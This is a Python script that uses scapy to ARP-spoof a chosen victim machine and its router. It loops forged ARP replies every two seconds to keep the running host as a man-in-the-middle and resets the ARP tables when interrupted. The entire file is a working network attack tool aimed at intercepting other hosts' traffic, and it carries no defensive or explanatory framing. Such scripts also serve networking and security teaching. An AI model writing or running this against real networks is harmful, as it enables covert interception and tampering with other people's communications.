import scapy.all as scapy
from argparse import ArgumentParser
import time


def get_args():
    parser = ArgumentParser()
    parser.add_argument("-t1",
                        "--target1",
                        dest="target_1",
                        required=True,
                        help="Target IP Address of Victim MACHINE")
    
    parser.add_argument("-t2",
                        "--target_2",
                        dest="target_2",
                        required=True,
                        help="Target IP Address of Victime Router"
                        )
    return parser.parse_args()

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_req
    response = scapy.srp(arp_req_broad, timeout=1, verbose=False)[0]
    #print(response)
    if len(response) == 0:
        print("\n[-] Target -> ",ip," is down") 
        exit(0)
    return response[0][1].hwsrc

def spoof(target_ip, target_mac, spoof_ip):
    # op -> arp response
    packet = scapy.ARP(op=2, 
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=spoof_ip) # scapy puts current machine MAC for HWSRC
    scapy.send(packet, verbose=False)

def restore_net(src, dst):
    packet =  scapy.ARP(op=2,
                         pdst=dst,
                         hwdst=get_mac(dst),
                         psrc=src,
                         hwsrc=get_mac(src))
    scapy.send(packet, count=4, verbose=False)

def run(t1, t2):
    t1_mac = get_mac(t1)
    t2_mac = get_mac(t2)
    count = 0
    while True:
        spoof(t1, t1_mac, t2)
        spoof(t2, t2_mac, t1)
        # ARP tables are reset to original values during each HTTP req-resp cycle
        # to maintain MITM persistence -> loop
        print("\r[+] Packets sent ->", count, end='')
        count+=2
        # delay req to prevent network overload
        time.sleep(2)



#---MAIN---#
res = get_args()

t_ip1, t_ip2 = res.target_1, res.target_2
try:
    run(t_ip1, t_ip2)
except KeyboardInterrupt:
    print("\n[-] Script Interrupted by User ")
    restore_net(t_ip1, t_ip2)
    restore_net(t_ip2, t_ip1)
    print("[-] ARP tables reset")
    exit()
